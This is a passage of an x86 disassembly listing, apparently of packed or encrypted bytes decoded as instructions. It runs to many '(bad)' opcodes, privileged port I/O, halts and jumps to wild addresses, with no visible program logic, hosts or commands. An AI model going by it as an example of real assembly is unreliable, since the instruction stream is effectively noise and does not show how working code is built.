  40181b:	or     eax,0x458d763d
  401820:	add    al,0x10
  401822:	mov    edi,DWORD PTR [esp]
  401825:	retf   
  401826:	cmp    dh,al
  401828:	mov    edx,0xd559dea7
  40182d:	outs   dx,BYTE PTR ds:[esi]
  40182e:	test   al,0x56
  401830:	cmp    eax,0x75515d4c
  401835:	fstp   TBYTE PTR [edi+0x5d]
  401838:	mov    DWORD PTR [ebx],0xa76d0f5
  40183e:	lea    edx,[eiz*2-0x7cf2de30]
  401845:	jbe    0x4017f3
  401847:	mov    bh,0x1a
  401849:	aam    0x5a
  40184b:	lods   al,BYTE PTR ds:[esi]
  40184c:	mov    bl,0x1
  40184e:	test   DWORD PTR [ebp+0x3789077a],0x348929fb
  401858:	in     eax,0x8d
  40185a:	jbe    0x4018c7
  40185c:	xchg   esi,eax
  40185d:	hlt    
  40185e:	or     BYTE PTR [ebx],al
  401860:	push   ds
  401861:	call   0x3b122272
  401866:	dec    edx
  401867:	mov    ah,0x91
  401869:	sti    
  40186a:	jbe    0x40189a
  40186c:	jns    0x401826
  40186e:	shl    BYTE PTR [eax-0x7a2992b],0x2
  401875:	jo     0x4018e6
  401877:	outs   dx,BYTE PTR ds:[esi]
  401878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401879:	data16 addr16 jo 0x4018da
  40187d:	in     eax,0x23
  40187f:	adc    al,0xfb
  401881:	add    al,0x9b
  401883:	loope  0x4018e1
  401885:	xchg   BYTE PTR [eax-0x5e],al
  401888:	or     dl,ch
  40188a:	add    eax,0xf4b1fab
  40188f:	xchg   ebp,eax
  401890:	scas   eax,DWORD PTR es:[edi]
  401891:	fisub  WORD PTR [ebx-0x37]
  401894:	sbb    bl,cl
  401896:	push   ebp
  401897:	(bad)  
  401898:	or     dl,bh
  40189a:	les    esp,FWORD PTR [ebp+0x5608e41b]
  4018a0:	jge    0x4018de
  4018a2:	jl     0x4018b1
  4018a4:	jmp    0x64c3bc5d
  4018a9:	or     eax,0xa14138e8
  4018ae:	jae    0x4018c2
  4018b0:	(bad)  
  4018b1:	ret    0x562
  4018b4:	int3   
  4018b5:	push   edi
  4018b6:	sti    
  4018b7:	sub    al,0xf0
  4018b9:	sar    al,0x37
  4018bc:	inc    ebp
  4018bd:	adc    al,0x7e
  4018bf:	inc    eax
  4018c0:	or     ch,ah
  4018c2:	cwde   
  4018c3:	mov    cl,0x30
  4018c5:	jns    0x4018d3
  4018c7:	pop    ds
  4018c8:	hlt    
  4018c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018ca:	xlat   BYTE PTR ds:[ebx]
  4018cb:	std    
  4018cc:	cs dec ebx
  4018ce:	sub    esp,DWORD PTR [ecx-0x13377ced]
  4018d4:	sbb    BYTE PTR [esi-0x3c],ch
  4018d7:	neg    DWORD PTR [ebx+eax*8+0x78]
  4018db:	push   es
  4018dc:	mov    esp,0x82060ec0
  4018e1:	stos   DWORD PTR es:[edi],eax
  4018e2:	dec    ecx
  4018e3:	cmp    al,0x25
  4018e5:	(bad)  
  4018e6:	push   edx
  4018e7:	inc    edx
  4018e8:	(bad)  
  4018e9:	xlat   BYTE PTR ds:[ebx]
  4018ea:	loop   0x4018ae
  4018ec:	lea    edx,[esi+0x2471a5a5]
  4018f2:	setl   BYTE PTR [ebp+0x3a4d660c]
  4018f9:	mov    eax,ds:0x1777fc5c
  4018fe:	and    esp,eax
  401900:	push   edx
  401901:	jp     0x4018db
  401903:	jae    0x40190f
  401905:	shl    BYTE PTR [eax],cl
  401907:	sub    DWORD PTR [edi],eax
  401909:	add    DWORD PTR [edi+0x52],eax
  40190c:	mov    ebx,ebp
  40190e:	add    al,BYTE PTR [eax]
  401910:	add    eax,DWORD PTR [ebx+esi*8]
  401913:	add    eax,DWORD PTR [eax]
  401915:	mov    dl,0x17
  401917:	jle    0x4018f1
  401919:	test   esi,0xa8180873
  40191f:	push   ss
  401920:	cmp    esi,eax
  401922:	jne    0x401935
  401924:	mov    WORD PTR [edx+edi*4],es
  401927:	arpl   si,bp
  401929:	adc    DWORD PTR [esi],ebx
  40192b:	sti    
  40192c:	jmp    0x194488b4
  401931:	or     DWORD PTR [ebx+0x6b156ab9],0x1a30821e
  40193b:	fst    QWORD PTR [ebp-0x5c20a795]
  401941:	(bad)  
  401942:	aam    0x8d
  401944:	inc    ebx
  401945:	ret    
  401946:	jnp    0x4018f3
  401948:	std    
  401949:	lods   al,BYTE PTR ds:[esi]
  40194a:	pop    es
  40194b:	js     0x4018d0
  40194d:	xchg   ebx,eax
  40194e:	fimul  DWORD PTR [ebx]
  401950:	mov    eax,esp
  401952:	xchg   esp,eax
  401953:	inc    eax
  401954:	add    BYTE PTR [ebx+0x280be01],al
  40195a:	mov    DWORD PTR [ebx],0xc31bb6ec
  401960:	and    ebx,DWORD PTR [esi-0x73]
  401963:	push   esi
  401964:	push   esp
  401965:	ret    
  401966:	xor    BYTE PTR [eax],cl
  401968:	and    BYTE PTR [ebp-0x13],bl
  40196b:	sub    al,0x85
  40196d:	pop    edi
  40196e:	push   ecx
  40196f:	pop    edx
  401970:	int3   
  401971:	or     al,cl
  401973:	cli    
  401974:	je     0x40198f
  401976:	(bad)  
  401978:	xchg   esi,eax
  401979:	jg     0x401994
  40197b:	iret   
  40197c:	add    ecx,0xffffffc6
  40197f:	in     eax,dx
  401980:	dec    esp
  401981:	xor    esp,0x123a831c
  401987:	or     BYTE PTR [edi+eiz*8-0x16fce81f],cl
  40198e:	mov    eax,DWORD PTR [edx]
  401990:	pop    edx
  401991:	and    esp,esi
  401993:	or     BYTE PTR [edi-0x3c3a7748],bh
  401999:	out    dx,eax
  40199a:	mov    ebp,0x5f08a1ba
  40199f:	push   es
  4019a0:	into   
  4019a1:	add    DWORD PTR [esi-0x7c],ebx
  4019a4:	mov    dh,0xc7
  4019a6:	stos   DWORD PTR es:[edi],eax
  4019a7:	aad    0xe
  4019a9:	nop
  4019aa:	xor    al,0xda
  4019ac:	lahf   
  4019ad:	lods   eax,DWORD PTR ds:[esi]
  4019ae:	fcom   DWORD PTR [eax]
  4019b0:	call   0xdd04:0x85a8916
  4019b7:	add    ebx,ebx
  4019b9:	mov    dl,0x2d
  4019bb:	fst    DWORD PTR [esi]
  4019bd:	or     edi,DWORD PTR [ebx]
  4019bf:	jg     0x401972
  4019c1:	pop    ss
  4019c2:	mov    WORD PTR [esi+0x33bbcddc],es
  4019c8:	pop    es
  4019c9:	je     0x4019f5
  4019cb:	int3   
  4019cc:	jbe    0x401976
  4019ce:	ins    BYTE PTR es:[edi],dx
  4019cf:	mov    ebx,0xc30e1b1d
  4019d4:	adc    ah,dl
  4019d6:	inc    ecx
  4019d7:	cmp    DWORD PTR [esi],0x7a
  4019da:	pusha  
  4019db:	or     eax,0xee8271de
  4019e0:	je     0x4019a6
  4019e2:	or     dh,BYTE PTR [ebp-0x79]
  4019e5:	adc    cl,BYTE PTR [ecx+0x3b]
  4019e8:	pop    ebp
  4019e9:	leave  
  4019ea:	shl    BYTE PTR [eax+0x298927dd],1
  4019f0:	add    al,0x9
  4019f2:	hlt    
  4019f3:	sub    al,0x11
  4019f5:	rcl    DWORD PTR [ecx+eiz*2-0x1fd338a3],0x7c
  4019fd:	sbb    al,0x46
  4019ff:	clc    
  401a00:	push   esi
  401a01:	add    DWORD PTR ds:0x4cfcc359,ebx
  401a07:	add    dh,bh
  401a09:	sub    al,0x67
  401a0b:	js     0x401a4f
  401a0d:	stc    
  401a0e:	ds jmp 0xdab3:0x6d23eb83
  401a16:	das    
  401a17:	fucomp st(3)
  401a19:	imul   edi,DWORD PTR [ebx+0x14],0xb5765084
  401a20:	test   eax,0x91c28db5
  401a25:	sar    BYTE PTR [esp+ecx*1+0x7d],0xd3
  401a2a:	xchg   edx,eax
  401a2b:	fmulp  st(6),st
  401a2d:	je     0x401a33
  401a2f:	xor    al,0xeb
  401a31:	push   ds
  401a32:	push   edi
  401a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a34:	jne    0x401a3d
  401a36:	iret   
  401a37:	add    BYTE PTR [eiz*1+0x580641d7],0xba
  401a3f:	pop    edx
  401a40:	gs iret 
  401a42:	mov    ecx,0x6a0cbaef
  401a47:	jo     0x401a6d
  401a49:	xchg   ah,dh
  401a4b:	mov    al,0xaf
  401a4d:	sub    esp,0x53
  401a50:	in     al,dx
  401a51:	sbb    al,0x4c
  401a53:	mov    ds:0xe3898647,al
  401a58:	or     eax,edi
  401a5a:	out    0xd7,al
  401a5c:	aad    0xb4
  401a5e:	je     0x401a0d
  401a60:	clc    
  401a61:	mov    bh,0x7e
  401a63:	jmp    0x401aaa
  401a65:	cld    
  401a66:	dec    eax
  401a67:	or     al,0xf9
  401a69:	lds    edx,FWORD PTR [ebx]
  401a6b:	test   DWORD PTR [esp+esi*8+0x40b89d23],0xc38303a3
  401a76:	fisttp DWORD PTR [esi-0x7d]
  401a79:	sti    
  401a7a:	fwait
  401a7b:	cmp    BYTE PTR [eax],bl
  401a7d:	pop    esi
  401a7e:	or     DWORD PTR ds:0x476b0cbb,eax
  401a84:	fimul  DWORD PTR [edi+0x421c2dac]
  401a8a:	xor    dh,ah
  401a8c:	push   ebp
  401a8d:	clc    
  401a8e:	cmp    eax,edi
  401a90:	ins    DWORD PTR es:[edi],dx
  401a91:	imul   ebp,ebp,0x74
  401a94:	aad    0x89
  401a96:	or     al,0xec
  401a98:	adc    esp,ebp
  401a9a:	pop    es
  401a9b:	xchg   edi,eax
  401a9c:	int    0xe0
  401a9e:	outs   dx,BYTE PTR ds:[esi]
  401a9f:	xchg   esp,eax
  401aa0:	and    bh,dh
  401aa2:	or     eax,0xf0f00ea4
  401aa7:	cmp    esp,DWORD PTR [eax+0xf]
  401aaa:	sub    al,0x6e
  401aac:	or     esi,DWORD PTR [ebp+0xe]
  401aaf:	fwait
  401ab0:	jmp    0x401ad8
  401ab2:	inc    ebx
  401ab3:	scas   al,BYTE PTR es:[edi]
  401ab4:	or     edx,DWORD PTR [edx]
  401ab6:	out    dx,eax
  401ab7:	dec    ebp
  401ab8:	lock push cs
  401aba:	loopne 0x401ac3
  401abc:	hlt    
  401abd:	sub    eax,0x1632cf6c
  401ac2:	mov    ds:0x16f8f4f0,eax
  401ac7:	in     al,dx
  401ac8:	pushw  0x5987
  401acc:	or     ebx,DWORD PTR [eax]
  401ace:	pop    ecx
  401acf:	pop    ss
  401ad0:	adc    BYTE PTR [esi+0x1687c90b],dh
  401ad6:	inc    ebp
  401ad7:	cld    
  401ad8:	ret    0xcc26
  401adb:	call   0x393ee001
  401ae0:	cmp    ebx,DWORD PTR ds:0x29537f4c
  401ae6:	pop    es
  401ae7:	shl    BYTE PTR [edi],cl
  401ae9:	popa   
  401aea:	push   edx
  401aeb:	in     al,dx
  401aec:	or     eax,0xe2a80e03
  401af1:	pop    ebx
  401af2:	cmp    BYTE PTR [ebp+0x5de1040d],dl
  401af8:	jmp    0x401b2c
  401afa:	jb     0x401b0e
  401afc:	jb     0x401ac5
  401afe:	inc    esp
  401aff:	adc    DWORD PTR [edi+ebx*1],ecx
  401b02:	das    
  401b03:	sti    
  401b04:	and    eax,DWORD PTR [esi-0x74bb01bd]
  401b0a:	inc    ebp
  401b0b:	cld    
  401b0c:	pop    ebx
  401b0d:	mov    esp,ebp
  401b0f:	lock stos DWORD PTR es:[edi],eax
  401b11:	and    BYTE PTR [edi+0x5b8172f0],al
  401b17:	mov    dl,0x1f
  401b19:	iret   
  401b1a:	nop
  401b1b:	cmp    ebx,ebp
  401b1d:	jne    0x401b35
  401b1f:	jae    0x401b29
  401b21:	mov    bl,0x6
  401b23:	(bad)  
  401b25:	lahf   
  401b26:	or     eax,0xcbce15b6
  401b2b:	and    eax,0xfcf85d89
  401b30:	sub    al,0xb8
  401b32:	or     al,0x21
  401b34:	push   ss
  401b35:	sub    bh,al
  401b37:	sbb    dh,dh
  401b39:	ret    
  401b3a:	mul    DWORD PTR [eax+0x67]
  401b3d:	sbb    esp,DWORD PTR [edi+0x45094c0f]
  401b43:	sahf   
  401b44:	dec    DWORD PTR ds:0x18bb7bce
  401b4a:	mov    ah,0xbe
  401b4c:	int    0x2b
  401b4e:	sub    DWORD PTR ds:0x30e329d5,eax
  401b54:	mov    dh,0x44
  401b56:	pop    ds
  401b57:	push   ebx
  401b58:	cmp    al,0xc
  401b5a:	popa   
  401b5b:	mov    cl,0x21
  401b5d:	cmp    DWORD PTR ds:0x3a907b8,0xfffffff5
  401b64:	or     dl,BYTE PTR ds:[esp+eax*4]
  401b68:	push   es
  401b69:	xchg   ch,cl
  401b6b:	cmp    esp,ecx
  401b6d:	adc    eax,0x6caca44c
  401b72:	push   ds
  401b73:	sbb    al,0xb1
  401b75:	ret    
  401b76:	and    al,0x22
  401b78:	lea    edi,[esi-0x10]
  401b7b:	add    al,0x95
  401b7d:	(bad)  
  401b7e:	loope  0x401b33
  401b80:	shl    BYTE PTR [ebx+eax*1-0x3d],1
  401b84:	sub    BYTE PTR [eax],bl
  401b86:	sub    al,0x29
  401b88:	outs   dx,BYTE PTR ds:[esi]
  401b89:	cmove  eax,DWORD PTR [esi+0x18]
  401b8d:	add    DWORD PTR [eax+0x4d7ed581],ebx
  401b93:	mov    BYTE PTR [ecx],dl
  401b95:	add    DWORD PTR ds:0x9ec6aa25,0xf8e3e25d
  401b9f:	or     eax,0x1e747200
  401ba4:	mov    bl,0xf8
  401ba6:	add    al,0xfb
  401ba8:	out    dx,al
  401ba9:	cmp    DWORD PTR [edx*4-0x7ce1b1f5],eax
  401bb0:	or     BYTE PTR [ecx],al
  401bb2:	jmp    0x401bf0
  401bb4:	pop    es
  401bb5:	or     DWORD PTR [esi-0xf8664ce],esi
  401bbb:	sbb    eax,DWORD PTR [eax*4-0x63514e28]
  401bc2:	or     BYTE PTR [ecx+0x9],al
  401bc5:	adc    BYTE PTR [eax],cl
  401bc7:	or     al,0x33
  401bc9:	xchg   ebx,eax
  401bca:	(bad)  
  401bcb:	into   
  401bcc:	dec    ebp
  401bcd:	sbb    dl,BYTE PTR [edi+eiz*8]
  401bd0:	lods   eax,DWORD PTR ds:[esi]
  401bd1:	lods   al,BYTE PTR ds:[esi]
  401bd2:	inc    eax
  401bd3:	js     0x401bf8
  401bd5:	mov    ecx,0xa19ea3d3
  401bda:	and    al,0xd6
  401bdc:	xor    ah,BYTE PTR [eax]
  401bde:	add    edx,esi
  401be0:	shl    BYTE PTR ds:0x461c585f,cl
  401be6:	sar    BYTE PTR [esi],cl
  401be8:	xchg   ecx,eax
  401be9:	jo     0x401be5
  401beb:	hlt    
  401bec:	(bad)  
  401bed:	sti    
  401bee:	mov    esi,DWORD PTR [eax]
  401bf0:	and    esi,0xe5c64bc2
  401bf6:	cmp    esi,ebx
  401bf8:	lods   eax,DWORD PTR ds:[esi]
  401bf9:	mov    dh,0x2b
  401bfb:	rol    BYTE PTR ds:0xd3174944,1
  401c01:	or     dl,bh
  401c03:	or     al,0xc2
  401c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c06:	lahf   
  401c07:	nop
  401c08:	out    dx,al
  401c09:	sub    ebp,ebx
  401c0b:	idiv   DWORD PTR [ebx]
  401c0d:	adc    eax,0x3c162d28
  401c12:	pusha  
  401c13:	mov    WORD PTR ds:0x6f8d0fc1,gs
  401c19:	xchg   DWORD PTR [edi+ebp*8+0x1801d8c8],ebp
  401c20:	sub    DWORD PTR [ebx+0x45b643de],ecx
  401c26:	pusha  
  401c27:	cmc    
  401c28:	pop    esp
  401c29:	cmp    al,0xf6
  401c2b:	add    BYTE PTR [edi-0x71e95ff8],bl
  401c31:	lds    esi,FWORD PTR [esi-0x15f99718]
  401c37:	cmp    ebp,0xffffffdc
  401c3a:	and    eax,esi
  401c3c:	ds inc ebp
  401c3e:	and    al,0xcd
  401c40:	dec    ch
  401c42:	add    ch,BYTE PTR [eax]
  401c44:	sub    BYTE PTR [eax-0x4f],ah
  401c47:	popa   
  401c48:	lock add eax,0xc7534cca
  401c4e:	push   cs
  401c4f:	ret    0x8bf9
  401c52:	sti    
  401c53:	sub    edi,esi
  401c55:	mov    eax,0x7f833b65
  401c5a:	dec    edi
  401c5b:	fadd   DWORD PTR [ecx]
  401c5d:	jmp    0x1474613
  401c62:	cmp    eax,0xa1185918
  401c67:	adc    ebp,DWORD PTR [eax+0x5ce9091]
  401c6d:	outs   dx,BYTE PTR fs:[esi]
  401c6f:	mov    cl,0x10
  401c71:	lods   al,BYTE PTR ds:[esi]
  401c72:	push   esi
  401c73:	jae    0x401c8b
  401c75:	mov    bl,0xcb
  401c77:	and    eax,0xf8bec108
  401c7c:	pop    edx
  401c7d:	or     ebx,eax
  401c7f:	pop    eax
  401c80:	sbb    dh,bh
  401c82:	not    DWORD PTR [edx+0x1784961c]
  401c88:	les    ecx,FWORD PTR [edi+0x77]
  401c8b:	imul   eax,DWORD PTR [ecx-0x39537d1],0xfffffffd
  401c92:	mov    DWORD PTR [ebx],0x7be421c5
  401c98:	cwde   
  401c99:	jmp    0xd2c419c9
  401c9e:	sub    ebp,edi
  401ca0:	aam    0xe
  401ca2:	mov    bl,0x4f
  401ca4:	mov    al,ds:0x4f652550
  401ca9:	add    ebx,ebp
  401cab:	in     al,0xd0
  401cad:	sub    al,0x5e
  401caf:	add    bl,BYTE PTR [ecx-0x15]
  401cb2:	cmp    edx,DWORD PTR ds:0x9c9bdf78
  401cb8:	iret   
  401cb9:	sub    ah,BYTE PTR [eax+0x15]
  401cbc:	xlat   BYTE PTR ds:[ebx]
  401cbd:	sbb    ebp,esp
  401cbf:	xchg   edx,eax
  401cc0:	xor    eax,0xa010341b
  401cc5:	push   cs
  401cc6:	mov    DWORD PTR [esi+edx*1+0x644810ae],ebx
  401ccd:	sbb    eax,0x86c21deb
  401cd2:	dec    esi
  401cd3:	xor    al,0x26
  401cd5:	ror    BYTE PTR [ebx],0x9
  401cd8:	ds and al,0x30
  401cdb:	in     al,0x90
  401cdd:	xlat   BYTE PTR ds:[ebx]
  401cde:	adc    eax,DWORD PTR [edx-0x160dbf5f]
  401ce4:	sbb    BYTE PTR [ebx+ecx*8+0x78d82899],bl
  401ceb:	test   eax,0x1561563b
  401cf0:	fmul   DWORD PTR [ebp-0x140327fb]
  401cf6:	cmp    eax,0xb1d3a19c
  401cfb:	in     eax,dx
  401cfc:	adc    dl,BYTE PTR [esp+ebx*2-0x79]
  401d00:	mov    BYTE PTR [eax-0x45],0xc5
  401d04:	nop
  401d05:	ror    DWORD PTR [ebx],0x7d
  401d08:	add    bl,BYTE PTR [esi+eax*8]
  401d0b:	jbe    0x401d2c
  401d0d:	clc    
  401d0e:	jle    0x401d84
  401d10:	adc    ch,BYTE PTR [ebx+ecx*8-0x6f]
  401d14:	sub    BYTE PTR [edx],bl
  401d16:	mov    eax,0x792143f
  401d1b:	xchg   BYTE PTR [ecx],al
  401d1d:	aas    
  401d1e:	int    0xa0
  401d20:	sub    BYTE PTR [edi-0xb],ah
  401d23:	stos   BYTE PTR es:[edi],al
  401d24:	(bad)  
  401d25:	(bad)  
  401d26:	aad    0x43
  401d28:	fmul   DWORD PTR [esi-0x64e9120a]
  401d2e:	jle    0x401d4a
  401d30:	dec    eax
  401d31:	call   DWORD PTR ds:0xc30ff038
  401d37:	ret    
  401d38:	mov    ebp,0x750517f9
  401d3d:	push   cs
  401d3e:	mov    al,0x1
  401d40:	sbb    DWORD PTR [eax-0x2830fa15],esp
  401d46:	ins    BYTE PTR es:[edi],dx
  401d47:	(bad)  [eax+0x15]
  401d4a:	jae    0x401cd1
  401d4c:	stos   BYTE PTR es:[edi],al
  401d4d:	adc    eax,0xece83c2a
  401d52:	push   ss
  401d53:	iret   
  401d54:	cmp    BYTE PTR ds:0x22702b0,ch
  401d5a:	aad    0x5b
  401d5c:	mov    eax,0x51c3feea
  401d61:	jmp    0x6a72922f
  401d66:	fld    TBYTE PTR [edi+edi*4-0x15]
  401d6a:	je     0x401d84
  401d6c:	push   eax
  401d6d:	mov    eax,ecx
  401d6f:	daa    
  401d70:	inc    eax
  401d71:	pop    ecx
  401d72:	or     DWORD PTR [edx],esi
  401d74:	sbb    esi,ebx
  401d76:	imul   esp,DWORD PTR [edi-0x25],0x70
  401d7a:	ret    
  401d7b:	sub    ecx,ebp
  401d7d:	lahf   
  401d7e:	sbb    BYTE PTR [eax-0x6a],al
  401d81:	cs mov dl,0xdd
  401d84:	pop    ss
  401d85:	jne    0x401d72
  401d87:	adc    eax,0xd0103101
  401d8c:	mov    ecx,0x84cdf33b
  401d91:	xor    edi,esp
  401d93:	outs   dx,DWORD PTR ds:[esi]
  401d94:	mov    DWORD PTR ds:0x6171004,edx
  401d9a:	popa   
  401d9b:	retf   
  401d9c:	bound  edx,QWORD PTR [eax+0xfe371c3]
  401da2:	cmp    eax,0x1dafa108
  401da7:	data16 fild DWORD PTR [eax+0x32]
  401dab:	or     al,0x84
  401dad:	pop    edi
  401dae:	xchg   BYTE PTR [edi-0x6],bh
  401db1:	outs   dx,BYTE PTR ds:[esi]
  401db2:	or     eax,0x8b2c4225
  401db7:	cwde   
  401db8:	add    al,0xfc
  401dba:	jo     0x8bb736bb
  401dc0:	(bad)  
  401dc1:	xlat   BYTE PTR ds:[ebx]
  401dc2:	sahf   
  401dc3:	sti    
  401dc4:	mov    al,bl
  401dc6:	mov    bl,BYTE PTR [eax+0x2d094144]
  401dcc:	stos   BYTE PTR es:[edi],al
  401dcd:	dec    eax
  401dce:	in     al,dx
  401dcf:	aas    
  401dd0:	inc    edi
  401dd1:	aas    
  401dd2:	jg     0x401d57
  401dd4:	loopne 0x401e55
  401dd6:	adc    edi,DWORD PTR [edx+0x54]
  401dd9:	ret    
  401dda:	push   eax
  401ddb:	push   edx
  401ddc:	push   ecx
  401ddd:	cmp    bh,BYTE PTR [ebx-0x7c8c5f23]
  401de3:	mov    eax,0x7b7558b3
  401de8:	xor    eax,eax
  401dea:	xchg   edi,eax
  401deb:	and    ah,BYTE PTR [ebx+0x2d]
  401dee:	push   ss
  401def:	repz je 0x401e4c
  401df2:	mov    DWORD PTR [edi+0x3dd5bc56],esi
  401df8:	add    cl,BYTE PTR [ecx+0x22058bc6]
  401dfe:	or     al,BYTE PTR [esi]
  401e00:	jmp    FWORD PTR [edi-0x1]
  401e03:	(bad)  [ebx+ebp*1-0x47]
  401e07:	jle    0x401e21
  401e09:	cmp    edx,eax
  401e0b:	jg     0x401e28
  401e0d:	sub    eax,edx
  401e0f:	inc    eax
  401e10:	cli    
  401e11:	jl     0x401e27
  401e13:	cmp    ecx,eax
  401e15:	jg     0x401e2b
  401e17:	add    esi,edx
  401e19:	mov    BYTE PTR [edi],cl
  401e1b:	inc    edi
  401e1c:	outs   dx,DWORD PTR ds:[esi]
  401e1d:	lock out dx,eax
  401e1f:	(bad)  
  401e20:	repz sahf 
  401e22:	adc    DWORD PTR [edx+0x31e58b01],edi
  401e28:	leave  
  401e29:	jmp    0x401e97
  401e2b:	shr    ebx,0xe8
  401e2e:	loopne 0x401db4
  401e30:	fcmovb st,st(6)
  401e32:	mov    BYTE PTR [edi],al
  401e34:	aas    
  401e35:	ret    0x1343
  401e38:	cmp    DWORD PTR [edx-0x49],0xfd1ed857
  401e3f:	fcmovnbe st,st(1)
  401e41:	mov    ebx,0x729f2d74
  401e46:	aaa    
  401e47:	push   ss
  401e48:	pop    esi
  401e49:	cdq    
  401e4a:	inc    ecx
  401e4b:	dec    eax
  401e4c:	mov    BYTE PTR [eax-0x3a],ch
  401e4f:	xchg   ecx,eax
  401e50:	add    DWORD PTR [edx],edi
  401e52:	add    al,0xed
  401e54:	(bad)  
  401e56:	mov    bh,0xfe
  401e58:	lea    eax,[esp+0x68504109]
  401e5f:	add    eax,0xdc008205
  401e64:	or     ebx,DWORD PTR [eax+0x54c117e3]
  401e6a:	lea    esi,[ebx+0x23503f14]
  401e70:	lods   al,BYTE PTR ss:[esi]
  401e72:	or     eax,0x1281f2a
  401e77:	mov    dh,0x83
  401e79:	jne    0x401ed5
  401e7b:	mov    ecx,0x6a582e20
  401e80:	adc    BYTE PTR [ebx+0x16],cl
  401e83:	adc    BYTE PTR [edx+0x44],ah
  401e86:	ja     0x401eac
  401e88:	or     ch,dh
  401e8a:	lock push ss
  401e8c:	and    dl,BYTE PTR [ecx-0x70]
  401e8f:	or     al,0xbc
  401e91:	xchg   edi,eax
  401e92:	in     eax,dx
  401e93:	call   DWORD PTR [edi]
  401e95:	jle    0x401e72
  401e97:	mov    edi,edx
  401e99:	mov    eax,ds:0x1377f739
  401e9e:	je     0x401ecf
  401ea0:	sar    ecx,0x2
  401ea3:	js     0x401ecf
  401ea5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ea7:	mov    ebx,0xed6b7fbf
  401eac:	and    ecx,0x3
  401eaf:	iret   
  401eb0:	mov    esp,0xfc317421
  401eb5:	lea    edi,[ecx+edi*1-0x4]
  401eb9:	sbb    BYTE PTR [ecx],dl
  401ebb:	std    
  401ebc:	loopne 0x401e78
  401ebe:	in     eax,dx
  401ebf:	pusha  
  401ec0:	sbb    DWORD PTR [ebx+0x1fc702c6],eax
  401ec6:	cld    
  401ec7:	and    cl,al
  401ec9:	scas   eax,DWORD PTR es:[edi]
  401eca:	xor    BYTE PTR [edx-0x69f9d766],dh
  401ed0:	or     BYTE PTR [eax-0x7c82e],bh
  401ed6:	sahf   
  401ed7:	xor    al,0x2b
  401ed9:	fdivr  QWORD PTR [ebx+0x66]
  401edc:	mov    ecx,DWORD PTR [eax+0x4]
  401edf:	sub    cx,0xd7b1
  401ee4:	push   edx
  401ee5:	dec    ecx
  401ee6:	lea    cx,[ebx]
  401ee9:	outs   dx,DWORD PTR ds:[esi]
  401eea:	lock sub ecx,0x2
  401eee:	jae    0x401e77
  401ef0:	(bad)  
  401ef2:	rol    DWORD PTR [eax],cl
  401ef4:	jmp    0x401f11
  401ef6:	cmp    al,0xd7
  401ef8:	cmc    
  401ef9:	retf   
  401efa:	(bad)  
  401efb:	jmp    0x401f14
  401efd:	pop    edi
  401efe:	add    dh,BYTE PTR [edi+eax*1+0x3d]
  401f02:	loopne 0x401f07
  401f04:	add    BYTE PTR [ecx+edx*1],0xcf
  401f08:	sbb    eax,0x67580166
  401f0d:	fs pop es
  401f0f:	mov    eax,ebx
  401f11:	int3   
  401f12:	ret    0xa16e
  401f15:	pusha  
  401f16:	mov    ds:0x1b0e1c72,eax
  401f1b:	adc    al,0x47
  401f1d:	(bad)  [edx+0x58be6019]
  401f23:	inc    ebx
  401f24:	cmp    eax,0xadbb7257
  401f29:	std    
  401f2a:	mov    bh,0x2f
  401f2c:	add    eax,0x2977d7b3
  401f31:	and    ax,0xd7b2
  401f35:	or     DWORD PTR [ebx],eax
  401f37:	jne    0x401f72
  401f39:	call   DWORD PTR [ebx-0x17]
  401f3c:	jae    0x401fb4
  401f3e:	test   eax,0xf6859e1c
  401f43:	or     ah,BYTE PTR [esp+esi*2]
  401f46:	sbb    esp,DWORD PTR [esi+0x1b]
  401f49:	outs   dx,BYTE PTR ds:[esi]
  401f4a:	mov    ebx,ebp
  401f4c:	dec    edi
  401f4d:	jmp    0x401f61
  401f4f:	hlt    
  401f50:	dec    eax
  401f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f52:	dec    eax
  401f53:	mov    eax,0x7b38442f
  401f58:	imul   esp,DWORD PTR [ebx-0x3a],0x88c70627
  401f5f:	int    0xf3
  401f61:	movzx  ebp,WORD PTR [edi]
  401f64:	shl    eax,0x10
  401f67:	add    ax,0xd189
  401f6b:	or     BYTE PTR [ecx],cl
  401f6d:	rep stos DWORD PTR es:[edi],eax
  401f6f:	mov    ecx,edx
  401f71:	rcl    esp,1
  401f73:	jo     0x401f5f
  401f75:	stos   BYTE PTR es:[edi],al
  401f76:	pop    edi
  401f77:	aas    
  401f78:	sub    BYTE PTR [eax+0xc],dl
  401f7b:	ins    BYTE PTR es:[edi],dx
  401f7c:	neg    BYTE PTR [ebx]
  401f7e:	fistp  QWORD PTR [esi-0x4024cefb]
  401f84:	int3   
  401f85:	add    BYTE PTR [edx+ecx*4],cl
  401f88:	push   ds
  401f89:	inc    esi
  401f8a:	je     0x401fac
  401f8c:	je     0x401f86
  401f8e:	mov    ch,0x0
  401f90:	push   es
  401f91:	retf   
  401f92:	iret   
  401f93:	repnz imul BYTE PTR ds:0x2b046274
  401f9a:	je     0x401ffb
  401f9c:	and    al,0x78
  401f9e:	je     0x401ffa
  401fa0:	pop    eax
  401fa1:	dec    edi
  401fa2:	neg    DWORD PTR [edx-0x35]
  401fa5:	je     0x401ffc
  401fa7:	xor    BYTE PTR [ecx],ch
  401fa9:	daa    
  401faa:	adc    DWORD PTR [eax+0x43],ecx
  401fad:	in     eax,dx
  401fae:	(bad)  
  401faf:	push   ss
  401fb0:	or     eax,0x17520bb
  401fb5:	sub    bl,0x30
  401fb8:	adc    DWORD PTR ds:0x9fff5ae,ebx
  401fbe:	ja     0x401fe5
  401fc0:	cmp    eax,edi
  401fc2:	ja     0x401fe5
  401fc4:	lea    eax,[eax+eax*4]
  401fc7:	add    eax,eax
  401fc9:	pop    ds
  401fca:	sub    edi,edx
  401fcc:	out    0xff,al
  401fce:	jmp    FWORD PTR [ebp-0x1f32013f]
  401fd4:	imul   edi,DWORD PTR [ebp+0x54],0xeb4609eb
  401fdb:	push   es
  401fdc:	neg    eax
  401fde:	jle    0x40202b
  401fe0:	js     0x40202b
  401fe2:	pop    ebx
  401fe3:	sub    esi,ebx
  401fe5:	arpl   WORD PTR [ebx+0x70],cx
  401fe8:	imul   ebx
  401fea:	inc    edi
  401feb:	inc    ch
  401fed:	and    bl,ch
  401fef:	pushf  
